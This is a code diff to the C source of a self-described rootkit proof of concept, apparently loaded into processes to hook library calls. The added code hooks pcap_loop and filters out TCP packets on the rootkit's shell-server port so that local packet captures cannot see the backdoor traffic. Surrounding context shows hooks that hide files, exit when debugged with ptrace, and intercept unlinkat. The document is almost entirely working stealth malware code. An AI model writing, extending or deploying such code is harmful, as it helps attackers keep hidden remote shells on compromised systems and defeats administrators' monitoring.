@@ -20,9 +20,9 @@
 #include <netinet/in.h>
 #include <pty.h>
 #include <unistd.h>
+#include <pcap/pcap.h>
 
 #include "etc.h"
-#include "shell.h"
 #include "libshserver.h"
 
 // Set up syscall hooks
@@ -145,6 +145,54 @@ int is_invisible(const char *path) {
     cleanup(bin_file, strlen(bin_file));
 
     return 0; // visible
+}
+
+void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
+    const struct sniff_ip *ip;
+    const struct sniff_tcp *tcp;
+
+    int size_ip;
+    int size_tcp;
+    int sport,dport;
+
+    // IP header offset
+    ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
+    size_ip = IP_HL(ip) * 4;
+    if (size_ip < 20) {
+        return; // invalid IP header length
+    }
+
+    switch (ip->ip_p) {
+        case IPPROTO_TCP:
+            // noop
+            break;
+        default:
+            if (old_pcap_callback) {
+                old_pcap_callback(args, header, packet);
+            }
+
+            return;
+    }
+
+    // TCP header offset
+    tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
+    size_tcp = TH_OFF(tcp) * 4;
+    if (size_tcp < 20) {
+        return; // invalid TCP header length
+    }
+
+    sport = htons(tcp->th_sport);
+    dport = htons(tcp->th_dport);
+
+    if ((sport == SHELL_SERVER_PORT) || (dport == SHELL_SERVER_PORT)) {
+        return; // hide traffic
+    } else {
+        if (old_pcap_callback) {
+            old_pcap_callback(args, header, packet);
+        }
+    }
+
+    return;
 }
 
 // Hooked ptrace function to exit on debug
@@ -297,5 +345,16 @@ int unlinkat(int dirfd, const char *pathname, int flags) {
     }
 
     return (long) syscall_list[SYS_UNLINKAT].syscall_func(dirfd, pathname, flags);
+}
+
+// Hooked pcap_loop function to avoids local sniffing
+int pcap_loop(pcap_t *p, int cnt, pcap_handler callback, u_char *user) {
+    DEBUG("[rootkit-poc]: pcap_loop hooked\n");
+
+    init(); // hook configurations
+
+    old_pcap_callback = callback;
+
+    return (long) syscall_list[SYS_PCAP_LOOP].syscall_func(p, cnt, packet_handler, user);
 }
 
